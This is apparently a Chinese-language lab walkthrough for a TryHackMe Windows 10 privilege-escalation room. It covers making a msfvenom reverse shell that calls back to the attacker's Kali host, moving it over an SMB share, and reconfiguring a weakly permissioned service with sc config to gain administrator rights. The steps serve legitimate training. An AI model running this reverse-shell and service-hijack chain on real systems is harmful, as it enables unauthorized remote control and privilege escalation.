# 0x00:在线漏洞平台利用  

本次的在线漏洞平台是Try hack me具体链接为https://tryhackme.com/room/windows10privesc。可以使用平台所提供的网页kali版，或者是用自己kali连到他们内网里面都可。

![](../Images/b50090f868ba9c2234e76f1d58290232.png)

  

攻击机: kali ip 10.4.37.12

目标机器:windows10 ip 10.10.143.152

![](../Images/53fd6d19049ef9fed2c4bd57e2c70d87.png)

  

首先使用xfreerdp进行远程连接

命令: xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.143.152

  

![](../Images/e42b68d2d8cf4c3536e04f4ac8049005.png)

  

# **0x01:制作反弹shell+传送到目标机器**

为了控制一波我们的windows10,我们得先在kali本地制作一个反弹shell先。

命令:

msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=10.4.37.12 LPORT=667 -f exe -o reverseshell.exe

![](../Images/b0e8a6ff343ddb22cb64397e2fcbd226.png)

![](../Images/b50090f868ba9c2234e76f1d58290232.png)

  

关于传送的到目标机器可以用kali自带的smbserver

命令: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

![](../Images/767b872f193aa66a47744863b764c7d7.png)

![](../Images/b50090f868ba9c2234e76f1d58290232.png)

  

然后在我们的windows10的CMD命令行模式下输入

命令:copy \\\\10.4.37.12\\kali\\revershell.exe C:\\PrivEsc\\reverseshell.exe

![](../Images/65f16ecc6ac5b42b515b5fe9216dbfb0.png)

![](../Images/b50090f868ba9c2234e76f1d58290232.png)

  

接着去到我们刚才存放的地方，记得提前在kali处打开波端口。一个点击就能获得了。

![](../Images/1e6ceabb3efca4ea54c40d31df9e858d.png)

  

# **0x02:不安全的服务权限设计**

由于管理员可能没有配置好相关用户权限导致普通用户可能对某些服务拥有过多的权限可以从普通用户升级为管理员。这里使用波攻击机所提供的accesschk.exe,可以看到user拥有更改daclsvc服务的service\_change\_config的权限。

命令: accesschk.exe -uwcqv "user" \*

![](../Images/1de940ba786968590c12dc40aab62b13.png)

![](../Images/b50090f868ba9c2234e76f1d58290232.png)

  

接下来就是查询波这个服务的路径,可以看到路径是在C:\\Program Files\\DACL Service\\daclservice.exe，我们可以把路径指到我们的反弹shell里面

命令:sc qc daclsvc

![](../Images/f24f582e185986398fa2e51d924f75fa.png)

![](../Images/b50090f868ba9c2234e76f1d58290232.png)

  

命令: sc config daclsvc binpath="\\"C:\\PrivEsc\\reverseshell.exe\\""

![](../Images/5178b360000be97cc77275ec1c41395b.png)

![](../Images/b50090f868ba9c2234e76f1d58290232.png)

  

重定向以后我们可以重启波,记得再开一个nc，最后我们的权限已经是管理员了。

命令:net start daclsvc

![](../Images/90c5771de36c37ed9d50f15e94d7485b.png)
